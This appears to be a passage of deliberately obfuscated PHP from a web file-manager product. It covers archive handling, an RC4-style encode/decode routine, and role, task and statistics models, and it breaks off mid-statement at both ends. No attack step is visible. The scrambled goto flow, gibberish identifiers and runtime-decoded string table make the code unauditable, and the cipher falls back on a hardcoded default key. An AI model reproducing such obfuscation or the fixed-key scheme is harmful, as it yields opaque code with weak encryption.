(!file_exists($EﬁÔ›øÒ”¡)) { show_json($D™±Öàµâø[1911], !1); } @rename($EﬁÔ›øÒ”¡, $eÕ·ëÚìù); goto aáÃØ©ÇÜÖ; E¶ΩôŒëÓì: mk_dir($dÖúêàıª); $eÕ·ëÚìù = $dÖúêàıª . md5($cä√ãÎÈ⁄ü . $dŸï„Îˆ·á . $BõÖ‚‹Èº≈); $DóùÑÜêãÌ = $D™±Öàµâø[33]; goto F®áó°∞∏˜; f±ß’í∞¿Ç: $D™±Öàµâø =& $_SERVER[¯èãÄπµ]; self::init(); $dÖúêàıª = TEMP_FILES . hash_path($cä√ãÎÈ⁄ü) . $D™±Öàµâø[8]; goto E¶ΩôŒëÓì; F®áó°∞∏˜: $CŸÖÑòÛÿΩ = self::extract($cä√ãÎÈ⁄ü, $dÖúêàıª, $dŸï„Îˆ·á, $DóùÑÜêãÌ); if (is_array($DóùÑÜêãÌ)) { show_json($D™±Öàµâø[1910], !1); } if (file_exists($eÕ·ëÚìù)) { IO::fileOut($eÕ·ëÚìù, $EﬁŸã∫·≥Ó, get_path_this($DóùÑÜêãÌ)); return; } goto eËÇûó» ´; aáÃØ©ÇÜÖ: if (!file_exists($eÕ·ëÚìù)) { del_dir($dÖúêàıª); show_json($D™±Öàµâø[1912]); } IO::fileOut($eÕ·ëÚìù, $EﬁŸã∫·≥Ó, $aì÷Ωê≠Ö); goto b’‹§¯á´Ê; b’‹§¯á´Ê: } static function create($e”–Ú¯‹¬É, $BäÂ§–€·⁄) { $e˜Õ¯⁄°Ãœ =& $_SERVER[¯èãÄπµ]; self::init(); $Fà∏ã’ËÒÓ = get_path_ext($e”–Ú¯‹¬É); $bπÇô¶ÉàÛ = !1; if (self::checkIfType($Fà∏ã’ËÒÓ, $e˜Õ¯⁄°Ãœ[297])) { if (kodZipArchive::support($e˜Õ¯⁄°Ãœ[1012])) { return kodZipArchive::create($e”–Ú¯‹¬É, $BäÂ§–€·⁄); } $C»äÍ‘Ï©¿ = new PclZip($e”–Ú¯‹¬É); foreach ($BäÂ§–€·⁄ as $BÇÇÿòè∏À => $f∏âÈ´ç‚∫) { $f∏âÈ´ç‚∫ = str_replace($e˜Õ¯⁄°Ãœ[463], $e˜Õ¯⁄°Ãœ[8], $f∏âÈ´ç‚∫); $EıáÛìåÇå = Kodio::clear(get_path_father($f∏âÈ´ç‚∫)); if ($BÇÇÿòè∏À == 0) { $bπÇô¶ÉàÛ = $C»äÍ‘Ï©¿->create($f∏âÈ´ç‚∫, PCLZIP_OPT_REMOVE_PATH, $EıáÛìåÇå, PCLZIP_CB_PRE_FILE_NAME, $e˜Õ¯⁄°Ãœ[1913]); continue; } $bπÇô¶ÉàÛ = $C»äÍ‘Ï©¿->add($f∏âÈ´ç‚∫, PCLZIP_OPT_REMOVE_PATH, $EıáÛìåÇå, PCLZIP_CB_PRE_FILE_NAME, $e˜Õ¯⁄°Ãœ[1913]); } } else { if (self::checkIfType($Fà∏ã’ËÒÓ, $e˜Õ¯⁄°Ãœ[1884])) { foreach ($BäÂ§–€·⁄ as $BÇÇÿòè∏À => $f∏âÈ´ç‚∫) { $f∏âÈ´ç‚∫ = str_replace($e˜Õ¯⁄°Ãœ[463], $e˜Õ¯⁄°Ãœ[8], $f∏âÈ´ç‚∫); $EıáÛìåÇå = Kodio::clear(get_path_father($f∏âÈ´ç‚∫)); if ($BÇÇÿòè∏À == 0) { $bπÇô¶ÉàÛ = PclTarCreate($e”–Ú¯‹¬É, array($f∏âÈ´ç‚∫), $Fà∏ã’ËÒÓ, null, $EıáÛìåÇå); continue; } $bπÇô¶ÉàÛ = PclTarAddList($e”–Ú¯‹¬É, array($f∏âÈ´ç‚∫), $e˜Õ¯⁄°Ãœ[33], $EıáÛìåÇå, $Fà∏ã’ËÒÓ); } } } return $bπÇô¶ÉàÛ; } } class Mcrypt { public static $defaultKey = "\141\x21\164\x61\153\101\72\x64\154\x6d\x63\154\144\105\x76\54\x65"; public static function encode($f“”èÑﬁÀÖ, $EØ∏ë„””Ÿ = '', $d∫√øÒèôÁ = 0, $bÖËáÉ©ã√ = '') { goto cØÕ’à…¯π; BûÃéÛ¥«¶: $fÖÖ¢¿∞£ü = str_replace(array($E≥Ø¶•Œ∞Ï[280], $E≥Ø¶•Œ∞Ï[8], $E≥Ø¶•Œ∞Ï[911]), array($E≥Ø¶•Œ∞Ï[408], $E≥Ø¶•Œ∞Ï[70], $E≥Ø¶•Œ∞Ï[91]), $fÖÖ¢¿∞£ü); return $fÖÖ¢¿∞£ü; goto C√ÙΩÂßä∞; B˜êó∏ÀÆ¥: $c±‡ßﬁ¢¥¢ = md5(substr($EØ∏ë„””Ÿ, 0, 16)); $CÁ¨Ø™¯¯¶ = md5(substr($EØ∏ë„””Ÿ, 16, 16)); $bÖËáÉ©ã√ = $bÖËáÉ©ã√ ? $bÖËáÉ©ã√ : md5(microtime()); goto aÓ˘≤Ï”ââ; aÓ˘≤Ï”ââ: $F‚“ª¥Üî— = substr($bÖËáÉ©ã√, -$d≤Ì˜ˆÉÔÂ); $Fü◊çõ◊ÍÜ = $c±‡ßﬁ¢¥¢ . md5($c±‡ßﬁ¢¥¢ . $F‚“ª¥Üî—); $c‚∆∆ë◊à = strlen($Fü◊çõ◊ÍÜ); goto eê∑à©£‘; eºó‰µ¬⁄›: $fÖÖ¢¿∞£ü = $E≥Ø¶•Œ∞Ï[33]; for ($fò¯£óÌµæ = $c≠ë¬É€ö = $aôÕ‘Ω§°‡ = 0; $aôÕ‘Ω§°‡ < $a∞ﬂè€Ò©ì; $aôÕ‘Ω§°‡++) { $fò¯£óÌµæ = ($fò¯£óÌµæ + 1) % 256; $c≠ë¬É€ö = ($c≠ë¬É€ö + $a≠ØÌÉã€≤[$fò¯£óÌµæ]) % 256; $eæÌ∑∏¬ÿ§ = $a≠ØÌÉã€≤[$fò¯£óÌµæ]; $a≠ØÌÉã€≤[$fò¯£óÌµæ] = $a≠ØÌÉã€≤[$c≠ë¬É€ö]; $a≠ØÌÉã€≤[$c≠ë¬É€ö] = $eæÌ∑∏¬ÿ§; $fÖÖ¢¿∞£ü .= chr(ord($f“”èÑﬁÀÖ[$aôÕ‘Ω§°‡]) ^ $a≠ØÌÉã€≤[($a≠ØÌÉã€≤[$fò¯£óÌµæ] + $a≠ØÌÉã€≤[$c≠ë¬É€ö]) % 256]); } $fÖÖ¢¿∞£ü = $F‚“ª¥Üî— . str_replace($E≥Ø¶•Œ∞Ï[911], $E≥Ø¶•Œ∞Ï[33], base64_encode($fÖÖ¢¿∞£ü)); goto BûÃéÛ¥«¶; cØÕ’à…¯π: $E≥Ø¶•Œ∞Ï =& $_SERVER[¯èãÄπµ]; $d≤Ì˜ˆÉÔÂ = 4; $EØ∏ë„””Ÿ = md5($EØ∏ë„””Ÿ ? $EØ∏ë„””Ÿ : self::$defaultKey); goto B˜êó∏ÀÆ¥; eê∑à©£‘: $f“”èÑﬁÀÖ = sprintf($E≥Ø¶•Œ∞Ï[1914], $d∫√øÒèôÁ ? $d∫√øÒèôÁ + time() : 0) . substr(md5($f“”èÑﬁÀÖ . $CÁ¨Ø™¯¯¶), 0, 16) . $f“”èÑﬁÀÖ; $a∞ﬂè€Ò©ì = strlen($f“”èÑﬁÀÖ); $B‚µôÒ‰ö© = array(); goto B˘Úƒ—ÌΩÓ; B˘Úƒ—ÌΩÓ: for ($aôÕ‘Ω§°‡ = 0; $aôÕ‘Ω§°‡ <= 255; $aôÕ‘Ω§°‡++) { $B‚µôÒ‰ö©[$aôÕ‘Ω§°‡] = ord($Fü◊çõ◊ÍÜ[$aôÕ‘Ω§°‡ % $c‚∆∆ë◊à]); } $a≠ØÌÉã€≤ = range(0, 255); for ($c≠ë¬É€ö = $aôÕ‘Ω§°‡ = 0; $aôÕ‘Ω§°‡ < 256; $aôÕ‘Ω§°‡++) { $c≠ë¬É€ö = ($c≠ë¬É€ö + $a≠ØÌÉã€≤[$aôÕ‘Ω§°‡] + $B‚µôÒ‰ö©[$aôÕ‘Ω§°‡]) % 256; $eæÌ∑∏¬ÿ§ = $a≠ØÌÉã€≤[$aôÕ‘Ω§°‡]; $a≠ØÌÉã€≤[$aôÕ‘Ω§°‡] = $a≠ØÌÉã€≤[$c≠ë¬É€ö]; $a≠ØÌÉã€≤[$c≠ë¬É€ö] = $eæÌ∑∏¬ÿ§; } goto eºó‰µ¬⁄›; C√ÙΩÂßä∞: } public static function decode($aÿ¿Œ®è≈è, $Bﬂ’Ûœ–◊Â = '') { goto c∆”Ω£ëÑ⁄; aöÇ√ØÇ≥ê: $Bﬂ’Ûœ–◊Â = md5($Bﬂ’Ûœ–◊Â ? $Bﬂ’Ûœ–◊Â : self::$defaultKey); $B◊∞øÕŒ„» = md5(substr($Bﬂ’Ûœ–◊Â, 0, 16)); $DÈé¶ﬁ≠⁄Ó = md5(substr($Bﬂ’Ûœ–◊Â, 16, 16)); goto fÎ∞⁄åËÔ÷; CÑ‡‚ ≈å„: if (($f∂£’µ¬ª¿ == 0 || $f∂£’µ¬ª¿ - time() > 0) && substr($Cá‡·›ïÖÏ, 10, 16) == substr(md5(substr($Cá‡·›ïÖÏ, 26) . $DÈé¶ﬁ≠⁄Ó), 0, 16)) { return substr($Cá‡·›ïÖÏ, 26); } else { return $a∑‰ìº√Ñ[33]; } goto d£ﬂƒÍ∑ã; d»⁄ÒçÜîú: $aÿ¿Œ®è≈è = base64_decode(substr($aÿ¿Œ®è≈è, $AÚü©•Ü¶π)); $F¿É»Ò√Ñã = strlen($aÿ¿Œ®è≈è); $DæÇ≈ﬂçÒ¶ = array(); goto Dë∑≈ÖúË˜; c∆”Ω£ëÑ⁄: $a∑‰ìº√Ñ =& $_SERVER[¯èãÄπµ]; $aÿ¿Œ®è≈è = str_replace(array($a∑‰ìº√Ñ[408], $a∑‰ìº√Ñ[70], $a∑‰ìº√Ñ[91]), array($a∑‰ìº√Ñ[280], $a∑‰ìº√Ñ[8], $a∑‰ìº√Ñ[911]), $aÿ¿Œ®è≈è); $AÚü©•Ü¶π = 4; goto aöÇ√ØÇ≥ê; fÎ∞⁄åËÔ÷: $cü◊“õ˘ùÌ = substr($aÿ¿Œ®è≈è, 0, $AÚü©•Ü¶π); $FÈ É®ø∆à = $B◊∞øÕŒ„» . md5($B◊∞øÕŒ„» . $cü◊“õ˘ùÌ); $CÛÿéΩú¡Ñ = strlen($FÈ É®ø∆à); goto d»⁄ÒçÜîú; Dë∑≈ÖúË˜: for ($AÓ€¶íŒÜ‘ = 0; $AÓ€¶íŒÜ‘ <= 255; $AÓ€¶íŒÜ‘++) { $DæÇ≈ﬂçÒ¶[$AÓ€¶íŒÜ‘] = ord($FÈ É®ø∆à[$AÓ€¶íŒÜ‘ % $CÛÿéΩú¡Ñ]); } $EèÉÁä¬óÙ = range(0, 255); for ($eùä®áÚòÖ = $AÓ€¶íŒÜ‘ = 0; $AÓ€¶íŒÜ‘ < 256; $AÓ€¶íŒÜ‘++) { $eùä®áÚòÖ = ($eùä®áÚòÖ + $EèÉÁä¬óÙ[$AÓ€¶íŒÜ‘] + $DæÇ≈ﬂçÒ¶[$AÓ€¶íŒÜ‘]) % 256; $aÁÊ©ÍÍì∂ = $EèÉÁä¬óÙ[$AÓ€¶íŒÜ‘]; $EèÉÁä¬óÙ[$AÓ€¶íŒÜ‘] = $EèÉÁä¬óÙ[$eùä®áÚòÖ]; $EèÉÁä¬óÙ[$eùä®áÚòÖ] = $aÁÊ©ÍÍì∂; } goto Bıò—Œ“ÖÂ; Bıò—Œ“ÖÂ: $Cá‡·›ïÖÏ = $a∑‰ìº√Ñ[33]; for ($CÇºÌ⁄‚åï = $eùä®áÚòÖ = $AÓ€¶íŒÜ‘ = 0; $AÓ€¶íŒÜ‘ < $F¿É»Ò√Ñã; $AÓ€¶íŒÜ‘++) { $CÇºÌ⁄‚åï = ($CÇºÌ⁄‚åï + 1) % 256; $eùä®áÚòÖ = ($eùä®áÚòÖ + $EèÉÁä¬óÙ[$CÇºÌ⁄‚åï]) % 256; $aÁÊ©ÍÍì∂ = $EèÉÁä¬óÙ[$CÇºÌ⁄‚åï]; $EèÉÁä¬óÙ[$CÇºÌ⁄‚åï] = $EèÉÁä¬óÙ[$eùä®áÚòÖ]; $EèÉÁä¬óÙ[$eùä®áÚòÖ] = $aÁÊ©ÍÍì∂; $Cá‡·›ïÖÏ .= chr(ord($aÿ¿Œ®è≈è[$AÓ€¶íŒÜ‘]) ^ $EèÉÁä¬óÙ[($EèÉÁä¬óÙ[$CÇºÌ⁄‚åï] + $EèÉÁä¬óÙ[$eùä®áÚòÖ]) % 256]); } $f∂£’µ¬ª¿ = intval(substr($Cá‡·›ïÖÏ, 0, 10)); goto CÑ‡‚ ≈å„; d£ﬂƒÍ∑ã: } } define($_SERVER[¯èãÄπµ][1915], 1); goto EüÛûæÂﬁπ; EãáÌ‡Í˜ÿ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\x72\x6f\x6c\145\114\x69\163\x74"; public $field = array("\156\x61\155\x65", "\141\165\164\150", "\154\x61\142\145\154", "\x64\x69\163\160\x6c\x61\x79", "\163\171\x73\x74\x65\x6d", "\144\145\163\143", "\x69\147\x6e\x6f\162\145\105\170\164", "\x69\x67\156\x6f\162\x65\106\x69\x6c\x65\x53\x69\172\145", "\141\144\x6d\x69\x6e\151\163\164\162\141\x74\x6f\162", "\163\x6f\x72\164"); public function listData($b≥•ï⁄å§ = false, $fº∑≤√ØÇ¢ = "\x73\157\x72\x74", $E›Ç—â≥ä• = false) { return parent::listData($b≥•ï⁄å§, $fº∑≤√ØÇ¢, $E›Ç—â≥ä•); } public function update($fãó«ëºà‚, $CôÉïÌãß∂) { goto DÎÁŸá”Êü; AçÇ⁄ë•õó: return parent::update($fãó«ëºà‚, $CôÉïÌãß∂); goto cê°∆©ñ´á; DÎÁŸá”Êü: $C„ÿùÀ•Ñé =& $_SERVER[¯èãÄπµ]; $c ”àÂ”„Ó = parent::listData($fãó«ëºà‚); $b˜«¥≥ÿ† = $this->findByName($CôÉïÌãß∂[$C„ÿùÀ•Ñé[28]]); goto eÍÛè´ûû’; eÍÛè´ûû’: if (!$c ”àÂ”„Ó || $b˜«¥≥ÿ† && $b˜«¥≥ÿ†[$C„ÿùÀ•Ñé[363]] != $c ”àÂ”„Ó[$C„ÿùÀ•Ñé[363]]) { return !1; } if ($b˜«¥≥ÿ†[$C„ÿùÀ•Ñé[2463]] == 1) { $CôÉïÌãß∂ = array($C„ÿùÀ•Ñé[28] => $CôÉïÌãß∂[$C„ÿùÀ•Ñé[28]], $C„ÿùÀ•Ñé[2105] => $CôÉïÌãß∂[$C„ÿùÀ•Ñé[2105]]); } $this->filterAuth($CôÉïÌãß∂[$C„ÿùÀ•Ñé[372]]); goto AçÇ⁄ë•õó; cê°∆©ñ´á: } public function remove($eœçæÛÈ„ú) { $d©˘¬◊Èë¯ = parent::listData($eœçæÛÈ„ú); if (!$d©˘¬◊Èë¯ || $d©˘¬◊Èë¯[$_SERVER[¯èãÄπµ][1082]]) { return !1; } return parent::remove($eœçæÛÈ„ú); } public function add($Dô∫≤ÿ‹£Î) { goto D›⁄ƒíÕ∞¿; D›⁄ƒíÕ∞¿: $BŸ—é¡Ú–¿ =& $_SERVER[¯èãÄπµ]; $BÚ°ÈØêöÔ = $Dô∫≤ÿ‹£Î[$BŸ—é¡Ú–¿[28]]; if ($this->findByName($BÚ°ÈØêöÔ)) { return !1; } goto fñÑËñõπä; fñÑËñõπä: $dù§≈åÃ†ˆ = array($BŸ—é¡Ú–¿[382] => $BÚ°ÈØêöÔ, $BŸ—é¡Ú–¿[2093] => $BŸ—é¡Ú–¿[33], $BŸ—é¡Ú–¿[2089] => $BŸ—é¡Ú–¿[2106], $BŸ—é¡Ú–¿[2464] => 1, $BŸ—é¡Ú–¿[2092] => 0, $BŸ—é¡Ú–¿[2465] => 0, $BŸ—é¡Ú–¿[2091] => $this->getSort()); $Dô∫≤ÿ‹£Î = array_merge($dù§≈åÃ†ˆ, $Dô∫≤ÿ‹£Î); $this->filterAuth($Dô∫≤ÿ‹£Î[$BŸ—é¡Ú–¿[372]]); goto Eß∑Ê∫ﬂƒç; Eß∑Ê∫ﬂƒç: return parent::insert($Dô∫≤ÿ‹£Î); goto bÛ»πÃ÷•; bÛ»πÃ÷•: } private function getSort() { $Dª˜§∑Ôá∞ =& $_SERVER[¯èãÄπµ]; $eØŸﬂΩ∂◊ﬂ = parent::listData(); $FÖ‚™üÚûÚ = array_to_keyvalue($eØŸﬂΩ∂◊ﬂ, $Dª˜§∑Ôá∞[33], $Dª˜§∑Ôá∞[2108]); return empty($FÖ‚™üÚûÚ) ? 0 : max($FÖ‚™üÚûÚ) + 1; } private function filterAuth(&$Eñí™°«œÜ) { $BÆ ã„ºêï =& $_SERVER[¯èãÄπµ]; $cø€∑ÿ‚Óà = array(); $E®À∫Ï±ç€ = array_filter(explode($BÆ ã„ºêï[47], $Eñí™°«œÜ)); foreach ($E®À∫Ï±ç€ as $Eñí™°«œÜ) { $DÉÍúè√∞» = explode($BÆ ã„ºêï[91], $Eñí™°«œÜ); if ($DÉÍúè√∞»[0] == $BÆ ã„ºêï[1767] && $DÉÍúè√∞»[1] != $BÆ ã„ºêï[1038]) { $Aõ«•Ùñı˘ = $DÉÍúè√∞»[0] . $BÆ ã„ºêï[91] . $DÉÍúè√∞»[1] . $BÆ ã„ºêï[2466]; if (!in_array($Aõ«•Ùñı˘, $E®À∫Ï±ç€)) { $cø€∑ÿ‚Óà[] = $Aõ«•Ùñı˘; } } $cø€∑ÿ‚Óà[] = $Eñí™°«œÜ; } $Eñí™°«œÜ = implode($BÆ ã„ºêï[47], $cø€∑ÿ‚Óà); } public function sort($c∑‡ûàà¨⁄, $Dõœ÷ÊÑ∏ñ) { return parent::update($c∑‡ûàà¨⁄, $Dõœ÷ÊÑ∏ñ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\56\164\x61\163\x6b\x4c\x69\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\164\171\160\x65", "\145\166\145\x6e\164", "\x74\x69\155\145", "\144\145\163\143", "\x73\x79\163\x74\x65\x6d", "\x65\156\x61\x62\154\x65", "\x6c\x61\163\x74\122\x75\156", "\163\x6f\x72\164"); public function listData($AÉÁ¨”ùÈÀ = false, $CÍèµæ‚Ÿ› = "\163\157\162\164", $A¶ßÀ†ã‘ï = false) { return parent::listData($AÉÁ¨”ùÈÀ, $CÍèµæ‚Ÿ›, $A¶ßÀ†ã‘ï); } public function add($b⁄◊€î√£Ù) { $CäâóáÇû‡ =& $_SERVER[¯èãÄπµ]; $aÑ•˘ªˆß÷ = $this->findByName($b⁄◊€î√£Ù[$CäâóáÇû‡[28]]); if ($aÑ•˘ªˆß÷) { return !1; } $b⁄◊€î√£Ù[$CäâóáÇû‡[1389]] = 0; $b⁄◊€î√£Ù[$CäâóáÇû‡[2108]] = $this->getSort(); return parent::insert($b⁄◊€î√£Ù); } private function getSort() { $eùí ¡æ”Æ =& $_SERVER[¯èãÄπµ]; $a§Ûﬁ∞ÿ å = parent::listData(); $BÛØ‹Ñ¬Ø‚ = array_to_keyvalue($a§Ûﬁ∞ÿ å, $eùí ¡æ”Æ[33], $eùí ¡æ”Æ[2108]); return empty($BÛØ‹Ñ¬Ø‚) ? 0 : max($BÛØ‹Ñ¬Ø‚) + 1; } public function update($C•Û£Ωàéñ, $dµÌ»ﬁ©Ôø) { $D∆∑øßÀáß =& $_SERVER[¯èãÄπµ]; $b◊†ÔËÏ©ø = $this->listData($C•Û£Ωàéñ); $fˆ”·∂çΩé = $this->findByName($dµÌ»ﬁ©Ôø[$D∆∑øßÀáß[28]]); if (!$b◊†ÔËÏ©ø || $fˆ”·∂çΩé && $fˆ”·∂çΩé[$D∆∑øßÀáß[363]] != $b◊†ÔËÏ©ø[$D∆∑øßÀáß[363]]) { return !1; } return parent::update($C•Û£Ωàéñ, $dµÌ»ﬁ©Ôø); } public function remove($BáÑﬂŸË¿æ, $cº◊¿èõä◊ = false) { $F⁄¢¯≤–≠å =& $_SERVER[¯èãÄπµ]; $Bàãø¥Èçà = $this->listData($BáÑﬂŸË¿æ); if (!$Bàãø¥Èçà) { return; } if (!$cº◊¿èõä◊ && $Bàãø¥Èçà[$F⁄¢¯≤–≠å[1082]] == $F⁄¢¯≤–≠å[83]) { return !1; } return parent::remove($BáÑﬂŸË¿æ); } public function enable($C◊›÷É€™Ç, $Bö©óñåÆ‹) { return $this->update($C◊›÷É€™Ç, array($_SERVER[¯èãÄπµ][2457] => $Bö©óñåÆ‹)); } public function run($F ç‹ﬂüÓ§) { return $this->update($F ç‹ﬂüÓ§, array($_SERVER[¯èãÄπµ][2467] => time())); } } goto d≥úºïç∆ö; Fô°æµ≠¡´: $cíî∆‚ÕÜÜ = $_SERVER[¯èãÄπµ][543]; if (strlen($cíî∆‚ÕÜÜ) < $_SERVER[¯èãÄπµ][544]) { die; } $_SERVER[œ] = explode($_SERVER[¯èãÄπµ][545], gzinflate(substr($_SERVER[¯èãÄπµ][546], 10, -8))); goto f’§îƒéÃ®; e≥ÇÃ«Ëß: class AnalysisModel extends ModelBaseLight { public function init($b≥∂¯®∏Æ›) { $aêøò¥”≥Ö =& $_SERVER[¯èãÄπµ]; $eŸ∏ãëîòÌ = array($aêøò¥”≥Ö[531] => array($aêøò¥”≥Ö[29] => $aêøò¥”≥Ö[2013], $aêøò¥”≥Ö[257] => array($aêøò¥”≥Ö[206], $aêøò¥”≥Ö[703], $aêøò¥”≥Ö[2014], $aêøò¥”≥Ö[2015])), $aêøò¥”≥Ö[2016] => array($aêøò¥”≥Ö[29] => $aêøò¥”≥Ö[2017], $aêøò¥”≥Ö[257] => array($aêøò¥”≥Ö[206], $aêøò¥”≥Ö[701], $aêøò¥”≥Ö[2018], $aêøò¥”≥Ö[2019], $aêøò¥”≥Ö[2020]))); if (!isset($eŸ∏ãëîòÌ[$b≥∂¯®∏Æ›])) { return !1; } $this->optionType = $eŸ∏ãëîòÌ[$b≥∂¯®∏Æ›][$aêøò¥”≥Ö[29]]; $this->field = $eŸ∏ãëîòÌ[$b≥∂¯®∏Æ›][$aêøò¥”≥Ö[257]]; return !0; } public function listData($bì›óŒ≈ôÏ = false, $E¨òé⁄‡ÉÏ = "\155\157\144\x69\x66\171\x54\151\x6d\x65", $cªè„ßÆƒ„ = false) { return parent::listData($bì›óŒ≈ôÏ, $E¨òé⁄‡ÉÏ, $cªè„ßÆƒ„); } public function trendList($DŒâ¥ÏÆ›´) { goto B…Œ≥Úå∫Ó; B…Œ≥Úå∫Ó: $a¯¡û ∞„ =& $_SERVER[¯èãÄπµ]; $eÑßè¢®™ = $this->listData(); if ($eÑßè¢®™) { $Bå·öÿÀ‡Â = end($eÑßè¢®™); $dÖÃ¿ó≠œ⁄ = date($a¯¡û ∞„[2021], strtotime($a¯¡û ∞„[2022])); if ($Bå·öÿÀ‡Â[$a¯¡û ∞„[206]] == $dÖÃ¿ó≠œ⁄) { return $eÑßè¢®™; } $B˜ñ∞ˆ¡±¢ = strtotime($Bå·öÿÀ‡Â[$a¯¡û ∞„[206]]); } goto C⁄ôé∏¯ú; C⁄ôé∏¯ú: if (!isset($B˜ñ∞ˆ¡±¢)) { $eï›å≤ôè± = $DŒâ¥ÏÆ›´ == $a¯¡û ∞„[531] ? $a¯¡û ∞„[473] : $a¯¡û ∞„[755]; $B˜ñ∞ˆ¡±¢ = Model($eï›å≤ôè±)->min($a¯¡û ∞„[183]); } $EÎ◊µˆ™¿– = $a¯¡û ∞„[2023] . ucfirst($DŒâ¥ÏÆ›´); $b∫±åü‘ã‹ = $this->dateList($B˜ñ∞ˆ¡±¢); goto B≈Ø¯ÕË⁄¢; B≈Ø¯ÕË⁄¢: foreach ($b∫±åü‘ã‹ as $dÖÃ¿ó≠œ⁄) { $this->{$EÎ◊µˆ™¿–}($dÖÃ¿ó≠œ⁄); } return $this->listData(); goto d”ªë€∏‹Ï; d”ªë€∏‹Ï: } private function dateList($E™¬ÂûÔÆº) { $F“¨Ã–æß =& $_SERVER[¯èãÄπµ]; $d£≈Ì⁄ûùã = $E™¬ÂûÔÆº; $cΩ÷ÎÚô™€ = strtotime($F“¨Ã–æß[2022]); $A”Û›Ó‹æµ = array(); while ($d£≈Ì⁄ûùã <= $cΩ÷ÎÚô™€) { $A”Û›Ó‹æµ[] = date($F“¨Ã–æß[2021], $d£≈Ì⁄ûùã); $d£≈Ì⁄ûùã = strtotime($F“¨Ã–æß[2024], $d£≈Ì⁄ûùã); } return $A”Û›Ó‹æµ; } public function _recordUser($AÖ∞ñäóÿ◊ = '') { goto fâØÀ·‰‚ô; DˆÑ‡Çéê≥: $Bäí÷ﬂπ‘° = array($b›ñÔ¬Í∂Ì[206] => $AÖ∞ñäóÿ◊, $b›ñÔ¬Í∂Ì[703] => (int) $CÑŸõıì…±, $b›ñÔ¬Í∂Ì[2014] => (int) $FÜ—àßúœö, $b›ñÔ¬Í∂Ì[2015] => (int) $Cò≈˘›∂Ø∂); return $this->insert($Bäí÷ﬂπ‘°); goto b¥º§±ç¶˜; E›¢·ÓöËØ: $FÇ¡∑≠øºπ = array($b›ñÔ¬Í∂Ì[183] => array($b›ñÔ¬Í∂Ì[931], $bÛñÍæ«ü°)); $CÑŸõıì…± = Model($b›ñÔ¬Í∂Ì[473])->where($FÇ¡∑≠øºπ)->count($b›ñÔ¬Í∂Ì[1424]); $FÇ¡∑≠øºπ[$b›ñÔ¬Í∂Ì[183]] = array($b›ñÔ¬Í∂Ì[317], array($eƒ≤»ÊíﬁÈ, $bÛñÍæ«ü°)); goto dóéÉˆ≠ˆí; fâØÀ·‰‚ô: $b›ñÔ¬Í∂Ì =& $_SERVER[¯èãÄπµ]; $eƒ≤»ÊíﬁÈ = strtotime(date($b›ñÔ¬Í∂Ì[2025], strtotime($AÖ∞ñäóÿ◊))); $bÛñÍæ«ü° = strtotime(date($b›ñÔ¬Í∂Ì[2026], strtotime($AÖ∞ñäóÿ◊))); goto E›¢·ÓöËØ; dóéÉˆ≠ˆí: $FÜ—àßúœö = Model($b›ñÔ¬Í∂Ì[473])->where($FÇ¡∑≠øºπ)->count($b›ñÔ¬Í∂Ì[1424]); $FÇ¡∑≠øºπ[$b›ñÔ¬Í∂Ì[29]] = $b›ñÔ¬Í∂Ì[2027]; $Cò≈˘›∂Ø∂ = Model($b›ñÔ¬Í∂Ì[2028])->where($FÇ¡∑≠øºπ)->count($b›ñÔ¬Í∂Ì[2029]); goto DˆÑ‡Çéê≥; b¥º§±ç¶˜: } public function _recordStore($c≠ªààôÜÌ = '') { goto b√†§€®›è; c≠Ü“œ‚Ûß: $e«Çñ«åùÚ = Model($A—∂ÀåÉ“Ç[755])->where($C´∫Ïíå√ˆ)->sum($A—∂ÀåÉ“Ç[77]); $a√ãﬁÚ§È = array($A—∂ÀåÉ“Ç[206] => $c≠ªààôÜÌ, $A—∂ÀåÉ“Ç[701] => (int) $B÷°ç˜ùßë, $A—∂ÀåÉ“Ç[2018] => (int) $d…¶∫ﬂÎÃÜ, $A—∂ÀåÉ“Ç[2019] => (int) $A“ˆŸππ§Ü, $A—∂ÀåÉ“Ç[2020] => (int) $e«Çñ«åùÚ); return $this->insert($a√ãﬁÚ§È); goto A˜à˘„ó¯ß; C ﬁ¶âø∫ß: $C´∫Ïíå√ˆ[$A—∂ÀåÉ“Ç[367]] = 1; $A“ˆŸππ§Ü = Model($A—∂ÀåÉ“Ç[755])->where($C´∫Ïíå√ˆ)->sum($A—∂ÀåÉ“Ç[77]); $C´∫Ïíå√ˆ[$A—∂ÀåÉ“Ç[367]] = 2; goto c≠Ü“œ‚Ûß; b√†§€®›è: $A—∂ÀåÉ“Ç =& $_SERVER[¯èãÄπµ]; $fî‚Éêê⁄ = strtotime(date($A—∂ÀåÉ“Ç[2026], strtotime($c≠ªààôÜÌ))); $C´∫Ïíå√ˆ = array($A—∂ÀåÉ“Ç[183] => array($A—∂ÀåÉ“Ç[931], $fî‚Éêê⁄)); goto Bƒè´ÎÀü·; Bƒè´ÎÀü·: $d…¶∫ﬂÎÃÜ = Model($A—∂ÀåÉ“Ç[418])->where($C´∫Ïíå√ˆ)->sum($A—∂ÀåÉ“Ç[77]); $C´∫Ïíå√ˆ[$A—∂ÀåÉ“Ç[366]] = 0; $B÷°ç˜ùßë = Model($A—∂ÀåÉ“Ç[755])->where($C´∫Ïíå√ˆ)->sum($A—∂ÀåÉ“Ç[77]); goto C ﬁ¶âø∫ß; A˜à˘„ó¯ß: } public function trend($d€≤ºüÃ¥‚, $A¬Ï°›©Ω) { goto d∫ÇÏ·˘µ´; dı∑›íñâá: if ($dµì·∆å®… && $A¬Ï°›©Ω != $a‘ÜΩéﬁ≤[1399]) { $eÀâÍÆÕ÷÷ = $dµì·∆å®…[0][$a‘ÜΩéﬁ≤[206]]; $C¬È°«áàû = $this->validDate($A¬Ï°›©Ω, $eÀâÍÆÕ÷÷); $eëúêÆ–—ò = array(); $bøÆÓüõÇç = array_to_keyvalue($dµì·∆å®…, $a‘ÜΩéﬁ≤[206]); foreach ($C¬È°«áàû as $AË„ï˘í‚√) { if (isset($bøÆÓüõÇç[$AË„ï˘í‚√])) { $Eûƒÿñüºë = $bøÆÓüõÇç[$AË„ï˘í‚√]; } else { $Eûƒÿñüºë = end($dµì·∆å®…); $Eûƒÿñüºë[$a‘ÜΩéﬁ≤[206]] = $AË„ï˘í‚√; if ($d€≤ºüÃ¥‚ == $a‘ÜΩéﬁ≤[531]) { $Eûƒÿñüºë[$a‘ÜΩéﬁ≤[2014]] = 